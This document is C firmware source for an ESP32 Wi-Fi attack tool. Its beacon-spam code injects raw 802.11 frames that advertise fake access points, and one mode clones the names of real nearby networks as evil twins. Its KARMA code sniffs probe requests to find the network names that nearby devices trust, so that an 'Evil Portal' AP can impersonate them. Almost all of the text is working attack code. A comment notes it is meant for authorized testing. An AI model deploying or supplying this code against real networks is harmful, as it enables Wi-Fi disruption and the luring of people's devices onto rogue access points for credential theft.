// Word pools for RANDOM mode — combined into believable home/phone/router SSIDs.
static const char *RND_PREFIX[] = {
    "AndroidAP", "iPhone di", "Galaxy", "Casa", "WiFi", "Rete", "FRITZ!Box", "TP-LINK", "HUAWEI",
    "Vodafone", "TIM", "Fastweb", "Linksys", "NETGEAR", "DIRECT", "Redmi", "Office", "Studio",
};
static const char *RND_SUFFIX[] = {
    "Luca", "Marco", "Guest", "5G", "Home", "Pro", "Plus", "Net", "HD", "X", "2024", "Free", "Lab",
};

#define MAX_BEACON          64   // hard cap on fake APs in flight (heap-backed, freed on stop)
#define BEACON_REPEAT        2   // frames per SSID per pass (Bruce sends 2; redundancy vs RX loss)
#define BEACON_DWELL_ROUNDS  4   // re-beacon the whole set N times per channel before hopping

static TaskHandle_t    s_bcn_task;
static volatile unsigned long s_bcn_frames;
static int64_t         s_bcn_start_us;
static int             s_bcn_mode;
// Heap-backed tables (allocated on start, freed on stop) — kept OUT of resident .bss per the
// boot-RAM discipline. ~2.5 KB total, trivially available once NX_NET_APP has freed httpd/L1.
static char    (*s_bcn_ssid)[33];
static uint8_t (*s_bcn_bssid)[6];
static bool     *s_bcn_wpa;
static volatile int s_bcn_n;

// A locally-administered, unicast random MAC (set bit1, clear the multicast bit0 of the first octet).
static void rand_laa_mac(uint8_t out[6])
{
    uint32_t a = esp_random(), b = esp_random();
    out[0] = (uint8_t)((a & 0xFC) | 0x02);
    out[1] = (uint8_t)(a >> 8); out[2] = (uint8_t)(a >> 16); out[3] = (uint8_t)(a >> 24);
    out[4] = (uint8_t)b;        out[5] = (uint8_t)(b >> 8);
}

// ---- CUSTOM mode: operator-typed SSID list ----------------------------------
// Staged by the app's text-entry screen BEFORE arming, then copied into the run table by
// beacon_populate(CUSTOM). Heap-backed (allocated once on first use); 33 B per slot.
static char (*s_custom)[33];
static int    s_custom_n;

void nucleo_wifiatk_beacon_custom_clear(void)
{
    if (!s_custom) s_custom = malloc(sizeof(*s_custom) * MAX_BEACON);
    s_custom_n = 0;
}
bool nucleo_wifiatk_beacon_custom_add(const char *ssid)
{
    if (!s_custom || s_custom_n >= MAX_BEACON || !ssid || !ssid[0]) return false;
    snprintf(s_custom[s_custom_n++], 33, "%s", ssid);
    return true;
}
int         nucleo_wifiatk_beacon_custom_count(void) { return s_custom ? s_custom_n : 0; }
const char *nucleo_wifiatk_beacon_custom_ssid(int i)
{
    return (s_custom && i >= 0 && i < s_custom_n) ? s_custom[i] : "";
}

static void gen_random_name(char *out, size_t cap)
{
    uint32_t a = esp_random(), b = esp_random();
    const char *p = RND_PREFIX[a % (sizeof RND_PREFIX / sizeof RND_PREFIX[0])];
    const char *s = RND_SUFFIX[(a >> 8) % (sizeof RND_SUFFIX / sizeof RND_SUFFIX[0])];
    snprintf(out, cap, "%s %s %02X", p, s, (unsigned)(b & 0xFF));
}

// Fill the fake-AP table for the chosen mode. Returns the count. Must run with Wi-Fi started
// (CLONE performs a passive scan). Stable BSSID + per-entry security are assigned here, once.
static int beacon_populate(int mode)
{
    int n = 0;
    if (mode == NUCLEO_BEACON_CLONE) {
        nucleo_wifiatk_scan();                       // passive recon of the real APs nearby
        for (int i = 0; i < s_ntargets && n < MAX_BEACON; i++) {
            if (!s_targets[i].ssid[0]) continue;     // skip cloaked APs (no SSID to clone)
            snprintf(s_bcn_ssid[n], 33, "%s", s_targets[i].ssid);
            rand_laa_mac(s_bcn_bssid[n]);            // our own BSSID -> a twin alongside the real AP
            s_bcn_wpa[n] = (s_targets[i].auth != WIFI_AUTH_OPEN);
            n++;
        }
        // Pad a thin neighbourhood up to a respectable wall so the app always does something visible.
        for (int i = 0; i < N_FUNNY && n < 24 && n < MAX_BEACON; i++) {
            snprintf(s_bcn_ssid[n], 33, "%s", FUNNY_SSIDS[i]);
            rand_laa_mac(s_bcn_bssid[n]); s_bcn_wpa[n] = (i % 5 == 0); n++;
        }
        return n;
    }
    if (mode == NUCLEO_BEACON_CUSTOM) {
        for (int i = 0; i < s_custom_n && n < MAX_BEACON; i++) {
            if (!s_custom[i][0]) continue;
            snprintf(s_bcn_ssid[n], 33, "%s", s_custom[i]);
            rand_laa_mac(s_bcn_bssid[n]);
            s_bcn_wpa[n] = false;                    // operator-named nets advertised open
            n++;
        }
        return n;                                    // 0 -> caller falls back to FUNNY
    }
    if (mode == NUCLEO_BEACON_RANDOM) {
        for (; n < 40 && n < MAX_BEACON; n++) {
            gen_random_name(s_bcn_ssid[n], 33);
            rand_laa_mac(s_bcn_bssid[n]);
            s_bcn_wpa[n] = (esp_random() & 1);       // ~half WPA2, half open — looks like a real area
        }
        return n;
    }
    for (; n < N_FUNNY && n < MAX_BEACON; n++) {      // FUNNY (default / fallback)
        snprintf(s_bcn_ssid[n], 33, "%s", FUNNY_SSIDS[n]);
        rand_laa_mac(s_bcn_bssid[n]);
        s_bcn_wpa[n] = (n % 5 == 0);                 // a few WPA2 ones for a credible lock icon
    }
    return n;
}

// Build + transmit one beacon. wpa=true adds an RSN IE (WPA2-PSK-CCMP) and sets the Privacy bit, so
// the AP shows a lock; wpa=false advertises an open network.
static void beacon_tx(const char *ssid, const uint8_t *bssid, uint8_t ch, bool wpa)
{
    uint8_t f[160]; int n = 0;
    f[n++] = 0x80; f[n++] = 0x00;                 // frame control: beacon (mgmt subtype 8)
    f[n++] = 0x00; f[n++] = 0x00;                 // duration
    memset(f + n, 0xFF, 6); n += 6;               // DA = broadcast
    memcpy(f + n, bssid, 6); n += 6;              // SA = our fake BSSID
    memcpy(f + n, bssid, 6); n += 6;              // BSSID
    f[n++] = 0x00; f[n++] = 0x00;                 // seq/frag (driver rewrites seq)
    memset(f + n, 0, 8); n += 8;                  // timestamp
    f[n++] = 0x64; f[n++] = 0x00;                 // beacon interval = 100 TU (~10 beacons/s)
    f[n++] = wpa ? 0x11 : 0x01; f[n++] = 0x04;    // capability: ESS + short slot (+ Privacy if WPA2)
    int sl = (int)strlen(ssid); if (sl > 32) sl = 32;
    f[n++] = 0x00; f[n++] = (uint8_t)sl; memcpy(f + n, ssid, sl); n += sl;          // SSID IE
    f[n++] = 0x01; f[n++] = 0x08;                 // supported rates IE
    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96; f[n++] = 0x24; f[n++] = 0x30; f[n++] = 0x48; f[n++] = 0x6C;
    f[n++] = 0x03; f[n++] = 0x01; f[n++] = ch;    // DS parameter set IE (current channel)
    f[n++] = 0x2A; f[n++] = 0x01; f[n++] = 0x00;  // ERP IE — strict 11g scanners drop beacons without it
    if (wpa) {                                    // RSN IE: WPA2-PSK CCMP (group CCMP, 1 pairwise CCMP, 1 AKM PSK)
        static const uint8_t rsn[] = {
            0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC,
            0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, 0x00, 0x00,
        };
        memcpy(f + n, rsn, sizeof rsn); n += (int)sizeof rsn;
    }
    s_tx_try++;
    bool ok = (esp_wifi_80211_tx(WIFI_IF_STA, f, n, false) == ESP_OK);
    if (ok) s_bcn_frames++;
    tx_pace(ok);
}

static void beacon_task(void *arg)
{
    (void)arg;
    static const uint8_t CHANS[] = { 1, 6, 11 };
    int ci = 0;
    while (s_bcn_run) {
        uint8_t ch = CHANS[ci++ % 3];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(5));             // settle on the channel
        // Verify the driver actually landed on this channel; re-assert if not (injecting on the wrong
        // channel is the classic "fires but nothing shows up"). Same guard the deauth flood uses.
        uint8_t pch = 0; wifi_second_chan_t sch;
        if (esp_wifi_get_channel(&pch, &sch) == ESP_OK && pch != ch)
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        // DWELL: re-beacon the whole set several times before hopping, so a phone scanning THIS
        // channel right now actually catches us (vs blast-once-then-hop, which it usually misses).
        for (int r = 0; r < BEACON_DWELL_ROUNDS && s_bcn_run; r++) {
            for (int i = 0; i < s_bcn_n && s_bcn_run; i++)
                for (int k = 0; k < BEACON_REPEAT; k++)
                    beacon_tx(s_bcn_ssid[i], s_bcn_bssid[i], ch, s_bcn_wpa[i]);
            vTaskDelay(1);                        // yield to the radio driver / WDT each round
        }
    }
    s_bcn_task = NULL;
    vTaskDelete(NULL);
}

static void beacon_free_tables(void)
{
    free(s_bcn_ssid);  s_bcn_ssid  = NULL;
    free(s_bcn_bssid); s_bcn_bssid = NULL;
    free(s_bcn_wpa);   s_bcn_wpa   = NULL;
}

esp_err_t nucleo_wifiatk_beacon_start(int mode)
{
    if (s_bcn_run) return ESP_OK;
    if (s_run)     return ESP_ERR_INVALID_STATE;  // the deauth flood already owns the radio
    if (mode < NUCLEO_BEACON_FUNNY || mode > NUCLEO_BEACON_CLONE) mode = NUCLEO_BEACON_FUNNY;

    s_bcn_ssid  = malloc(sizeof(*s_bcn_ssid)  * MAX_BEACON);
    s_bcn_bssid = malloc(sizeof(*s_bcn_bssid) * MAX_BEACON);
    s_bcn_wpa   = malloc(sizeof(*s_bcn_wpa)   * MAX_BEACON);
    if (!s_bcn_ssid || !s_bcn_bssid || !s_bcn_wpa) { beacon_free_tables(); return ESP_ERR_NO_MEM; }

    s_bcn_frames = 0;
    s_tx_try = 0; s_tx_fail = 0; s_pace_us = 0; s_ok_run = 0;
    s_bcn_start_us = esp_timer_get_time();
    s_bcn_mode = mode;

    nucleo_setup_suspend();                         // no real-MAC re-association to home mid-attack
    nucleo_exclusive_enter(NX_NET_APP, NULL);       // stop httpd + mDNS + voice + L1 (we own the radio; no NX_WIFI)
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_ps(WIFI_PS_NONE);
    rf_boost();                                                      // chip-max power + ext antenna if wired
    esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_1M_L);   // robust long-range beacons

    // Build the fake-AP table now that Wi-Fi is up (CLONE scans here). scan() flips to APSTA, so
    // force STA back before we go promiscuous to inject.
    s_bcn_n = beacon_populate(mode);
    if (s_bcn_n <= 0) s_bcn_n = beacon_populate(NUCLEO_BEACON_FUNNY);
    esp_wifi_set_mode(WIFI_MODE_STA);

    // CRITICAL for visibility: in Solo the device is still ASSOCIATED to the home AP (Wi-Fi stays up
    // for cloud), which PINS the radio to that AP's channel. Our 1/6/11 channel-hop then gets dragged
    // back, so beacons leak on one channel only and a phone scanning the band misses them. Drop the
    // association (auto-reconnect already suspended above) so esp_wifi_set_channel actually sticks.
    esp_wifi_disconnect();

    esp_err_t pe = esp_wifi_set_promiscuous(true);  // free channel control + raw inject
    if (pe != ESP_OK) {
        beacon_free_tables();
        nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
        return pe;
    }
    s_bcn_run = true;
    if (xTaskCreate(beacon_task, "wa_beacon", 4096, NULL, 5, &s_bcn_task) != pdPASS) {
        s_bcn_run = false;
        esp_wifi_set_promiscuous(false);
        beacon_free_tables();
        nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
        return ESP_FAIL;
    }
    ESP_LOGW(TAG, "Beacon spam ARMED: mode %d, %d fake SSIDs", mode, s_bcn_n);
    return ESP_OK;
}

void nucleo_wifiatk_beacon_stop(void)
{
    if (!s_bcn_run) return;
    s_bcn_run = false;
    for (int i = 0; i < 40 && s_bcn_task; i++) vTaskDelay(pdMS_TO_TICKS(25));
    esp_wifi_set_promiscuous(false);
    nucleo_setup_apply_network();        // network up first
    nucleo_exclusive_exit();             // restart httpd + mDNS + voice; ANIMA L1 reloads lazily
    beacon_free_tables();                // task is gone (waited above) -> safe to free the tables
    ESP_LOGI(TAG, "Beacon spam disarmed; network + OS web UI restored");
}

bool          nucleo_wifiatk_beacon_running(void) { return s_bcn_run; }
unsigned long nucleo_wifiatk_beacon_frames(void)  { return s_bcn_frames; }
int           nucleo_wifiatk_beacon_count(void)   { return s_bcn_n; }
int           nucleo_wifiatk_beacon_mode(void)    { return s_bcn_mode; }
// % of beacon TX attempts the driver accepted (shares the AIMD counters). Low = the chip is dropping
// frames under the flood — the honest "it fires but nothing shows up" signal, surfaced in the UI.
int           nucleo_wifiatk_beacon_health(void)
{
    unsigned long t = s_tx_try;
    return t ? (int)((s_tx_try - s_tx_fail) * 100 / t) : 100;
}
unsigned      nucleo_wifiatk_beacon_uptime_s(void)
{
    return s_bcn_run ? (unsigned)((esp_timer_get_time() - s_bcn_start_us) / 1000000) : 0;
}

// ---- KARMA: probe-request discovery -----------------------------------------
// Devices constantly emit DIRECTED probe requests for the networks in their saved list ("is CasaX
// here?"). KARMA listens for those and reports which SSIDs people nearby are looking for, so the
// operator can stand up the Evil Portal AP wearing one of those names — the device then recognises
// "its" network and associates on its own, no deauth needed. We only SNIFF + LIST here (the operator
// picks the lure); standing up the AP is the portal engine's job. Channel-hops the whole 2.4 GHz band
// for the scan window. AUTHORIZED testing only. The SSID parse is the host-tested wifiatk_probe_ssid.
// RAM-tight: 33-byte SSID + a 16-bit hit count = 36 B/slot, x20 = 720 B, allocated LAZILY on first
// scan (NOT static .bss — ~1KB of .bss bricked the ADV boot before). The sniff runs in its OWN task,
// so the foreground/launcher loop keeps iterating and feeding its watchdog: a SYNCHRONOUS multi-second
// scan in the app tick was what tripped the Task-WDT and rebooted (the deauth flood uses a task for
// exactly this reason). Tiny crit-section in the RX callback; no snprintf on the radio path.
#define KARMA_MAX 20
typedef struct { char ssid[33]; uint16_t hits; } km_t;
static km_t *s_km;
static volatile int  s_km_n;
static volatile bool s_km_busy, s_km_run;
static TaskHandle_t  s_km_task;
static int           s_km_secs;

static void karma_add(const char *ssid)
{
    if (!s_km) return;
    taskENTER_CRITICAL(&s_mux);
    int slot = -1;
    for (int i = 0; i < s_km_n; i++) if (strcmp(s_km[i].ssid, ssid) == 0) { slot = i; break; }
    if (slot >= 0) { if (s_km[slot].hits < 0xFFFF) s_km[slot].hits++; }
    else if (s_km_n < KARMA_MAX) {
        char *dst = s_km[s_km_n].ssid; int j = 0;
        while (ssid[j] && j < 32) { dst[j] = ssid[j]; j++; }
        dst[j] = 0;
        s_km[s_km_n].hits = 1; s_km_n++;
    }
    taskEXIT_CRITICAL(&s_mux);
}

static void karma_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    char ss[33];
    if (wifiatk_probe_ssid(pkt->payload, pkt->rx_ctrl.sig_len, ss, sizeof ss) > 0) karma_add(ss);
}

// Channel-hop + sniff for the window, then tear the radio down and restore the network. Runs as its
// own task so it never blocks the UI loop. Sets s_km_busy=false only after the list is sorted and the
// network is restored — the app polls that to know the result is ready.
static void karma_task(void *arg)
{
    (void)arg;
    static const uint8_t CH[] = { 1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13 };
    int64_t end = esp_timer_get_time() + (int64_t)s_km_secs * 1000000;
    int ci = 0;
    while (s_km_run && esp_timer_get_time() < end) {
        esp_wifi_set_channel(CH[ci++ % 13], WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(120));            // probes are sporadic; keep moving, yield to IDLE
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    nucleo_setup_apply_network();                  // network up first
    nucleo_exclusive_exit();                        // restart httpd/mDNS/voice (no-op in Solo)
    // Sort most-requested first (the RX cb is stopped now, so no lock needed).
    for (int i = 1; i < s_km_n; i++) {
        km_t key = s_km[i]; int j = i - 1;
        while (j >= 0 && s_km[j].hits < key.hits) { s_km[j + 1] = s_km[j]; j--; }
        s_km[j + 1] = key;
    }
    ESP_LOGI(TAG, "karma: %d SSID(s) probed", s_km_n);
    s_km_task = NULL;
    s_km_busy = false;
    vTaskDelete(NULL);
}

// Start an asynchronous KARMA listen of `secs` (clamped 2..30). Returns 0 on success (poll
// nucleo_wifiatk_karma_busy() until false, then read the list), or <0 on failure.
int nucleo_wifiatk_karma_start(int secs)
{
    if (s_run || s_bcn_run || s_km_busy) return -1;   // radio busy
    if (!s_km) { s_km = calloc(KARMA_MAX, sizeof(km_t)); if (!s_km) return -3; }
    if (secs < 2) secs = 2;
    if (secs > 30) secs = 30;
    s_km_secs = secs; s_km_n = 0;

    nucleo_setup_suspend();
    nucleo_exclusive_enter(NX_NET_APP, NULL);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_ps(WIFI_PS_NONE);
    // NOTE: do NOT esp_wifi_disconnect() here. In promiscuous mode esp_wifi_set_channel() already
    // forces the monitor channel regardless of the STA association, so the hop works either way — and
    // the deauth flood proves STA+promiscuous+channel-hop is stable for minutes WITHOUT disconnecting,
    // whereas dropping the association left the driver churning and rebooting after a few seconds.
    esp_wifi_set_promiscuous_rx_cb(karma_cb);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        esp_wifi_set_promiscuous_rx_cb(NULL);
        nucleo_setup_apply_network(); nucleo_exclusive_exit();
        return -2;
    }
    s_km_busy = true; s_km_run = true;
    if (xTaskCreate(karma_task, "wa_karma", 3072, NULL, 5, &s_km_task) != pdPASS) {
        s_km_busy = false; s_km_run = false;
        esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(NULL);
        nucleo_setup_apply_network(); nucleo_exclusive_exit();
        return -4;
    }
    return 0;
}

bool        nucleo_wifiatk_karma_busy(void)    { return s_km_busy; }
int         nucleo_wifiatk_karma_count(void)   { return s_km ? s_km_n : 0; }
const char *nucleo_wifiatk_karma_ssid(int i)   { return (s_km && i >= 0 && i < s_km_n) ? s_km[i].ssid : ""; }
int         nucleo_wifiatk_karma_hits(int i)   { return (s_km && i >= 0 && i < s_km_n) ? s_km[i].hits : 0; }
